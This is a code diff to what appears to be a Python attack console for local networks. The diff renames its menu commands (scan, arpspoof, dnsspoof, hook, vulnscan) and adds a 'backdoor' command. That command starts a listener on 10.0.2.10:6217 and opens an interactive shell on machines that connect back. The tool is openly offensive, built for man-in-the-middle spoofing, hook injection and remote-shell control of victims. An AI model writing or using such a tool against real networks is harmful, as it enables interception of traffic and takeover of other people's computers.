@@ -11,6 +11,7 @@ import ctypes
 import os
 
 from VulnerabilityScanner import Scanner
+from Listener import Listener
 
 
 # function that returns a list with responses from a broadcast
@@ -307,7 +308,7 @@ allow_arp = 1  # flag that shows if an arp spoof is already running
 allow_dns = 1  # flag that shows if a dns spoof is already running
 allow_hook = 1  # flag that shows if a hook injector is already running
 scan_result = []  # list of network IPs
-router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip
+router_ip = scapy.conf.route.route("0.0.0.0")[2]  # router's ip
 
 try:
     is_admin = os.getuid() == 0
@@ -315,25 +316,29 @@ except AttributeError:
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
 print('Welcome back Boss!')
+# my_listener = multiprocessing.Process(target=Listener, args=("10.0.2.10", 6217))
+# my_listener.start()
+
+
 while True:
     print("Insert your command:")
     command = input(">> ")
     # try:
-    if command == "exit()":
+    if command == "exit":
         kill_arp()
         print("[+] Cya later Boss!")
         time.sleep(0.1)
         sys.exit()
 
-    elif command == "scan()":
+    elif command == "scan":
         scan_result = network_scanner()
 
-    elif command == "arpspoof()":
+    elif command == "arpspoof":
         if allow_arp:
             if scan_result:
                 option = ''
                 while option != 'auto' and option != 'man':
-                    print('Type "man" or "auto" for arpspoof()')
+                    print('Type "man" or "auto" for arpspoof')
                     option = input(">> Option: ")
                 if option == 'man':
                     selected = []
@@ -361,12 +366,12 @@ while True:
                         print("[-] Router IP not found. Choose manually..")
                         time.sleep(0.1)
             else:
-                print("[-] Network IPs not defined. Please scan() first.")
+                print("[-] Network IPs not defined. Please scan first.")
                 time.sleep(0.1)
         else:
             print('[!] Arp spoof already running.')
 
-    elif command == 'dnsspoof()':
+    elif command == 'dnsspoof':
         if allow_dns:
             try:
                 if arp_process.is_alive():
@@ -385,7 +390,7 @@ while True:
         else:
             print('[!] Dns spoof already running.')
 
-    elif command == 'hook()':
+    elif command == 'hook':
         if allow_hook:
             try:
                 if arp_process.is_alive():
@@ -402,7 +407,7 @@ while True:
         else:
             print('[!] Hook injector already running.')
 
-    elif command == 'vulnscan()':
+    elif command == 'vulnscan':
         login_info = False
         ignore_links = []
         target_url = input('Your target URL: ')
@@ -429,33 +434,40 @@ while True:
             print("[!] Something went wrong.")
         print("\n[+] Process finished...")
 
-    elif command == 'killarp()':
+    elif command == 'backdoor':
+        my_listener = Listener("10.0.2.10", 6217)  # listener for incoming connections
+        service = multiprocessing.Process(target=my_listener.server)
+        service.start()
+        my_listener.shell()
+        service.terminate()
+
+    elif command == 'killarp':
         kill_arp()
 
-    elif command == 'killdns()':
+    elif command == 'killdns':
         kill_dns()
 
-    elif command == 'killhook()':
+    elif command == 'killhook':
         kill_hook()
 
-    elif command == "help()":
+    elif command == "help":
         print("----------------------------------")
-        print("COMMANDS        DESCRIPTION")
+        print("COMMANDS      DESCRIPTION")
         print("----------------------------------")
-        print("help()          Show commands")
-        print("scan()          Network scanning")
-        print("arpspoof()      Manual or Auto Arp Spoof")
-        print("dnsspoof()      DNS Spoof Attack")
-        print("hook()          Hook Injector")
-        print("killarp()       Kill process running Arp Spoof")
-        print("killdns()       Kill process running Dns Spoof")
-        print("killhook()      Kill process running Hook Injector")
-        print("vulnscan()      Vulnerability Scanner")
-        print("exit()          Exit the app")
+        print("help          Show commands")
+        print("scan          Network scanning")
+        print("arpspoof      Manual or Auto Arp Spoof")
+        print("dnsspoof      DNS Spoof Attack")
+        print("hook          Hook Injector")
+        print("killarp       Kill process running Arp Spoof")
+        print("killdns       Kill process running Dns Spoof")
+        print("killhook      Kill process running Hook Injector")
+        print("vulnscan      Vulnerability Scanner")
+        print("exit          Exit the app")
         print("----------------------------------")
 
     else:
-        print('[-] Command not found. Type help() to show commands.')
+        print('[-] Command not found. Type help to show commands.')
 
     # except Exception:
     #     print('[-] Error during command execution.')
